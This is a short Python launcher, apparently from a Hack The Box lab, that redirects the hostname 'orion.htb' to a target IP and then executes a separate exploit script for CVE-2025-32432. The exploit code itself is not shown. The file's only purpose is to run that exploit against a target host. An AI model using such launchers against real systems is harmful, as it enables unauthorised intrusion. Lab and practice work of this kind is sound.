import socket
import sys

TARGET_IP = "10.129.244.146"
_orig_getaddrinfo = socket.getaddrinfo


def patched_getaddrinfo(host, *args, **kwargs):
    if host == "orion.htb":
        host = TARGET_IP
    return _orig_getaddrinfo(host, *args, **kwargs)


socket.getaddrinfo = patched_getaddrinfo

sys.argv = ["exploit.py"] + sys.argv[1:]
exec(compile(open("E06_exploit_cve-2025-32432.py", encoding="utf-8").read(), "E06_exploit_cve-2025-32432.py", "exec"))
